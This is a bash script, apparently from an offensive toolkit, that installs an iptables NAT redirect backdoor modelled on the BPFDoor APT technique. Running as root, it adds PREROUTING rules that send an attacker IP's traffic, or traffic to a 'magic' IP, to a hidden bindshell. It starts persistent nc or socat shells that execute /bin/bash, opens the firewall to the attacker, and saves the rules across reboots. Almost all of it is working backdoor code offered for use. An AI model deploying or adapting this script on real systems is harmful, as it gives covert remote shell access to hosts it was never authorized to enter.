#!/bin/bash
# iptables NAT Redirect Backdoor (T1205)
# Inserts NAT PREROUTING rules to redirect specific-source traffic to a hidden bindshell
# Based on BPFDoor APT technique — traffic appears legitimate to passive observers

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_iptnat"
CHAIN_NAME="D3M0N_NAT"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║      iptables NAT Redirect Backdoor (T1205)          ║"
    echo " ║  Redirects attacker traffic to hidden bindshell       ║"
    echo " ║  BPFDoor APT technique — appears legitimate           ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    command -v iptables >/dev/null 2>&1 || { echo -e "${RED}[-] iptables not found${NC}"; exit 1; }
    command -v ncat >/dev/null 2>&1 || command -v nc >/dev/null 2>&1 || \
        command -v socat >/dev/null 2>&1 || { echo -e "${YELLOW}[!] No netcat/socat — install for bindshell${NC}"; }
}

start_bindshell() {
    local BIND_PORT="$1"
    # Start persistent bindshell in background
    local NC_BIN
    NC_BIN=$(command -v ncat 2>/dev/null || command -v nc 2>/dev/null)
    if [ -n "$NC_BIN" ]; then
        nohup "$NC_BIN" -lkp "$BIND_PORT" -e /bin/bash >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Bindshell started on port ${BIND_PORT} (PID: $!)${NC}"
    elif command -v socat >/dev/null 2>&1; then
        nohup socat TCP-LISTEN:"${BIND_PORT}",reuseaddr,fork EXEC:/bin/bash,pty,stderr >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Bindshell (socat) started on port ${BIND_PORT} (PID: $!)${NC}"
    else
        echo -e "${YELLOW}[!] No nc/socat found — start bindshell manually on port ${BIND_PORT}${NC}"
    fi
}

install_nat_redirect() {
    local ATTACKER_IP="$1" DEST_PORT="$2" BIND_PORT="$3" PROTO="${4:-tcp}"

    # Create custom chain
    iptables -t nat -N "$CHAIN_NAME" 2>/dev/null

    # Source-IP specific redirect: only redirect traffic from attacker IP
    iptables -t nat -A PREROUTING \
        -s "$ATTACKER_IP" \
        -p "$PROTO" \
        --dport "$DEST_PORT" \
        -j REDIRECT --to-port "$BIND_PORT" \
        -m comment --comment "$MARKER"

    # Also add to OUTPUT for local loopback testing
    iptables -t nat -A OUTPUT \
        -s "$ATTACKER_IP" \
        -p "$PROTO" \
        --dport "$DEST_PORT" \
        -j REDIRECT --to-port "$BIND_PORT" \
        -m comment --comment "$MARKER" 2>/dev/null

    # Ensure bindshell port is allowed
    iptables -I INPUT -p "$PROTO" --dport "$BIND_PORT" \
        -s "$ATTACKER_IP" -j ACCEPT \
        -m comment --comment "$MARKER" 2>/dev/null

    echo -e "${GREEN}[+] NAT rule installed:${NC}"
    echo -e "  Attacker: ${ATTACKER_IP} → ${DEST_PORT} → bindshell:${BIND_PORT}"
    echo -e "${YELLOW}[!] Traffic from other IPs on port ${DEST_PORT} routes normally${NC}"
}

install_magic_redirect() {
    # BPFDoor-style: redirect based on magic destination IP range
    local MAGIC_IP="$1" DEST_PORT="$2" BIND_PORT="$3"
    iptables -t nat -A PREROUTING \
        -d "$MAGIC_IP" \
        -p tcp \
        --dport "$DEST_PORT" \
        -j REDIRECT --to-port "$BIND_PORT" \
        -m comment --comment "$MARKER"
    echo -e "${GREEN}[+] Magic IP redirect: ${MAGIC_IP}:${DEST_PORT} → :${BIND_PORT}${NC}"
}

persist_rules() {
    # Save iptables rules for persistence across reboots
    if command -v iptables-save >/dev/null 2>&1; then
        if [ -f /etc/iptables/rules.v4 ]; then
            iptables-save > /etc/iptables/rules.v4
            echo -e "${GREEN}[+] Rules persisted to /etc/iptables/rules.v4${NC}"
        elif command -v service >/dev/null 2>&1; then
            service iptables save 2>/dev/null && echo -e "${GREEN}[+] Rules saved via service${NC}"
        else
            iptables-save > /etc/sysconfig/iptables 2>/dev/null && \
                echo -e "${GREEN}[+] Rules saved to /etc/sysconfig/iptables${NC}"
        fi
    fi
}

list_rules() {
    echo -e "${YELLOW}[*] D3M0N NAT rules:${NC}"
    iptables -t nat -L --line-numbers -n 2>/dev/null | grep -A1 -B1 "$MARKER" | while read -r l; do
        echo "  $l"
    done
    echo -e "${YELLOW}[*] Filter rules:${NC}"
    iptables -L INPUT --line-numbers -n 2>/dev/null | grep "$MARKER" | while read -r l; do
        echo "  $l"
    done
}

cleanup() {
    echo -e "${YELLOW}[*] Removing iptables rules...${NC}"
    # Flush rules with our comment
    iptables -t nat -S 2>/dev/null | grep "$MARKER" | sed 's/^-A /-D /' | while read -r rule; do
        eval "iptables -t nat $rule" 2>/dev/null
    done
    iptables -S 2>/dev/null | grep "$MARKER" | sed 's/^-A /-D /' | while read -r rule; do
        eval "iptables $rule" 2>/dev/null
    done
    # Delete custom chain
    iptables -t nat -F "$CHAIN_NAME" 2>/dev/null
    iptables -t nat -X "$CHAIN_NAME" 2>/dev/null
    echo -e "${GREEN}[+] Rules removed${NC}"
    persist_rules
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }
check_deps

echo -e "  ${YELLOW}[1]${NC} Source-IP redirect (attacker IP → legit port → bindshell)"
echo -e "  ${YELLOW}[2]${NC} Magic IP redirect (BPFDoor-style)"
echo -e "  ${YELLOW}[3]${NC} Start bindshell on custom port"
echo -e "  ${YELLOW}[4]${NC} Persist rules across reboots"
echo -e "  ${YELLOW}[5]${NC} List active rules"
echo -e "  ${YELLOW}[6]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "Attacker IP: " ATTACKER
        read -rp "Redirect port (e.g. 443): " DPORT
        read -rp "Bindshell port (e.g. 31337): " BPORT
        read -rp "Protocol [tcp]: " PROTO; PROTO="${PROTO:-tcp}"
        install_nat_redirect "$ATTACKER" "$DPORT" "$BPORT" "$PROTO"
        read -rp "Auto-start bindshell? (y/N): " yn
        [[ "$yn" =~ ^[Yy] ]] && start_bindshell "$BPORT"
        ;;
    2)
        read -rp "Magic dest IP: " MIP
        read -rp "Dest port [443]: " DPORT; DPORT="${DPORT:-443}"
        read -rp "Bindshell port [31337]: " BPORT; BPORT="${BPORT:-31337}"
        install_magic_redirect "$MIP" "$DPORT" "$BPORT"
        read -rp "Auto-start bindshell? (y/N): " yn
        [[ "$yn" =~ ^[Yy] ]] && start_bindshell "$BPORT"
        ;;
    3)
        read -rp "Bindshell port: " BPORT
        start_bindshell "$BPORT"
        ;;
    4) persist_rules ;;
    5) list_rules ;;
    6) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
